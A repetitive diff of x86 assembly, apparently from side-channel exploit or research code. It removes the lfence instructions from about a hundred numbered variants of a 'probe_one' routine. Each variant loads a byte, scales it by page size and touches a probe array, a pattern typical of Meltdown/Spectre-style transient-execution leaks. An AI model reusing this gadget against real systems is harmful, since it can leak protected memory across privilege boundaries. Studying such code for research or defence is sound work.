@@ -3313,10 +2915,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 201
@@ -3324,10 +2924,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 202
@@ -3335,10 +2933,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 203
@@ -3346,10 +2942,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 204
@@ -3357,10 +2951,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 205
@@ -3368,10 +2960,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 206
@@ -3379,10 +2969,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 207
@@ -3390,10 +2978,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 208
@@ -3401,10 +2987,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 209
@@ -3412,10 +2996,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 210
@@ -3423,10 +3005,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 211
@@ -3434,10 +3014,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 212
@@ -3445,10 +3023,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 213
@@ -3456,10 +3032,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 214
@@ -3467,10 +3041,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 215
@@ -3478,10 +3050,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 216
@@ -3489,10 +3059,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 217
@@ -3500,10 +3068,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 218
@@ -3511,10 +3077,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 219
@@ -3522,10 +3086,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 220
@@ -3533,10 +3095,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 221
@@ -3544,10 +3104,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 222
@@ -3555,10 +3113,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 223
@@ -3566,10 +3122,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 224
@@ -3577,10 +3131,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 225
@@ -3588,10 +3140,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 226
@@ -3599,10 +3149,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 227
@@ -3610,10 +3158,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 228
@@ -3621,10 +3167,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 229
@@ -3632,10 +3176,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 230
@@ -3643,10 +3185,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 231
@@ -3654,10 +3194,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 232
@@ -3665,10 +3203,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 233
@@ -3676,10 +3212,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 234
@@ -3687,10 +3221,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 235
@@ -3698,10 +3230,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 236
@@ -3709,10 +3239,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 237
@@ -3720,10 +3248,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 238
@@ -3731,10 +3257,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 239
@@ -3742,10 +3266,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 240
@@ -3753,10 +3275,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 241
@@ -3764,10 +3284,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 242
@@ -3775,10 +3293,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 243
@@ -3786,10 +3302,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 244
@@ -3797,10 +3311,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 245
@@ -3808,10 +3320,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 246
@@ -3819,10 +3329,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 247
@@ -3830,10 +3338,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 248
@@ -3841,10 +3347,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 249
@@ -3852,10 +3356,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 250
@@ -3863,10 +3365,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 251
@@ -3874,10 +3374,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 252
@@ -3885,10 +3383,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 253
@@ -3896,10 +3392,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 254
@@ -3907,10 +3401,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 255
@@ -3918,10 +3410,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 256
@@ -3929,10 +3419,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 257
@@ -3940,10 +3428,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 258
@@ -3951,10 +3437,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 259
@@ -3962,10 +3446,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 260
@@ -3973,10 +3455,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 261
@@ -3984,10 +3464,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 262
@@ -3995,10 +3473,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 263
@@ -4006,10 +3482,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 264
@@ -4017,10 +3491,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 265
@@ -4028,10 +3500,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 266
@@ -4039,10 +3509,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 267
@@ -4050,10 +3518,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 268
@@ -4061,10 +3527,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 269
@@ -4072,10 +3536,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 270
@@ -4083,10 +3545,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 271
@@ -4094,10 +3554,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 272
@@ -4105,10 +3563,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 273
@@ -4116,10 +3572,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 274
@@ -4127,10 +3581,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 275
@@ -4138,10 +3590,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 276
@@ -4149,10 +3599,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 277
@@ -4160,10 +3608,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 278
@@ -4171,10 +3617,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 279
@@ -4182,10 +3626,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 280
@@ -4193,10 +3635,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 281
@@ -4204,10 +3644,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 282
@@ -4215,10 +3653,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 283
@@ -4226,10 +3662,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 284
@@ -4237,10 +3671,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 285
@@ -4248,10 +3680,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 286
@@ -4259,10 +3689,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 287
@@ -4270,10 +3698,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 288
@@ -4281,10 +3707,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 289
@@ -4292,10 +3716,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 290
@@ -4303,10 +3725,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 291
@@ -4314,10 +3734,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 292
@@ -4325,10 +3743,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 293
@@ -4336,10 +3752,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 294
@@ -4347,10 +3761,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 295
@@ -4358,10 +3770,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 296
@@ -4369,10 +3779,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 297
@@ -4380,10 +3788,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 298
@@ -4391,10 +3797,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 299
@@ -4402,10 +3806,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 300
@@ -4413,10 +3815,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 301
@@ -4424,10 +3824,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
